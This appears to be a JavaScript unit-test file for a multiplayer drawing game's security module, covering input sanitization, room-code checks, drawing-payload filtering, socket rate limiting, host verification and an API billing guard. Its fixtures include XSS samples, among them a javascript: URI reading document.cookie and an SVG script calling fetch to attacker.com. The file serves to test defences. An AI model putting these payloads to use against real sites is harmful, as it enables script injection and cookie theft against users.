import assert from 'assert';
import { sanitizeText, validateRoomCode, validateDrawingData, socketRateLimiter, verifyHost } from './src/security.js';
import { checkGeminiStatus } from './src/aiGenerator.js';

console.log('--- STARTING SECURITY & ANTI-HACKER UNIT TESTS ---');

// 1. Text Sanitization (XSS Defense)
console.log('[Test 1] Testing XSS & HTML Sanitization...');
const xssPayload = '<script>alert("hacked")</script>Detective Holmes';
const sanitizedName = sanitizeText(xssPayload, 20);
assert.strictEqual(sanitizedName, 'Detective Holmes', 'Script tags must be completely stripped');
assert.strictEqual(sanitizeText('Hello <b>World</b>', 10), 'Hello Worl', 'HTML tags stripped and max length enforced');
console.log('  ✅ XSS input sanitization passed!');

// 2. Room Code Validation
console.log('[Test 2] Testing Room Code Validation...');
assert.strictEqual(validateRoomCode('ABCD'), 'ABCD');
assert.strictEqual(validateRoomCode('w8x2'), 'W8X2');
assert.strictEqual(validateRoomCode('ABCDE'), null, '5-character codes must be rejected');
assert.strictEqual(validateRoomCode('A$CD'), null, 'Special characters must be rejected');
assert.strictEqual(validateRoomCode('<script>'), null, 'Script injection in room code rejected');
console.log('  ✅ Room code validation passed!');

// 3. Drawing Payload Sanitization (Malicious SVG & Memory Bombs)
console.log('[Test 3] Testing Drawing Payload Sanitizer...');
const validPng = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==';
assert.strictEqual(validateDrawingData(validPng), validPng, 'Valid base64 PNG data URI must be accepted');

const maliciousJsDrawing = 'javascript:alert(document.cookie)';
assert.strictEqual(validateDrawingData(maliciousJsDrawing), '', 'javascript: URI must be rejected');

const maliciousSvg = 'data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg"><script>fetch("http://attacker.com")</script></svg>';
assert.strictEqual(validateDrawingData(maliciousSvg), '', 'SVG containing <script> must be rejected');

const maliciousSvgOnload = 'data:image/svg+xml;utf8,<svg onload="alert(1)"></svg>';
assert.strictEqual(validateDrawingData(maliciousSvgOnload), '', 'SVG containing onload must be rejected');

const oversizedPayload = 'data:image/png;base64,' + 'A'.repeat(120000);
assert.strictEqual(validateDrawingData(oversizedPayload), '', 'Drawings over 100KB must be rejected');
console.log('  ✅ Malicious drawing and memory bomb defenses passed!');

// 4. Socket Rate Limiter (Anti-DoS / Anti-Flooding)
console.log('[Test 4] Testing Socket Event Rate Limiting...');
const testSocketId = 'test_sock_999';
// Allow 3 events per 1000ms
assert.strictEqual(socketRateLimiter.checkLimit(testSocketId, 'test-action', 3, 1000), true);
assert.strictEqual(socketRateLimiter.checkLimit(testSocketId, 'test-action', 3, 1000), true);
assert.strictEqual(socketRateLimiter.checkLimit(testSocketId, 'test-action', 3, 1000), true);
// 4th event must be blocked
assert.strictEqual(socketRateLimiter.checkLimit(testSocketId, 'test-action', 3, 1000), false, '4th event should be rate-limited');
socketRateLimiter.cleanupSocket(testSocketId);
console.log('  ✅ Socket rate limiting passed!');

// 5. Host Privilege Verification
console.log('[Test 5] Testing Host Privilege Enforcement...');
const mockRoom = { hostId: 'lead_detective_id' };
assert.strictEqual(verifyHost(mockRoom, 'lead_detective_id'), true, 'Real host must be verified');
assert.strictEqual(verifyHost(mockRoom, 'hacker_socket_id'), false, 'Attacker must be rejected');
assert.strictEqual(verifyHost(null, 'lead_detective_id'), false, 'Null room must be safely handled');
console.log('  ✅ Host privilege enforcement passed!');

// 6. Financial Billing Guard & Cached Diagnostic Status
console.log('[Test 6] Testing Financial Billing Guard Status...');
const status = await checkGeminiStatus(false);
assert.ok(status, 'Status object must be returned');
if (status.configured) {
  assert.ok(status.billingProtection, 'Billing protection metrics must be present');
  assert.strictEqual(status.billingProtection.maxCallsPerHour, 50);
  assert.strictEqual(status.billingProtection.maxCallsPerDay, 300);
}
console.log('  ✅ Financial billing guard verified active!');

console.log('--- ALL SECURITY & ANTI-HACKER TESTS PASSED SUCCESSFULLY! ---');
process.exit(0);
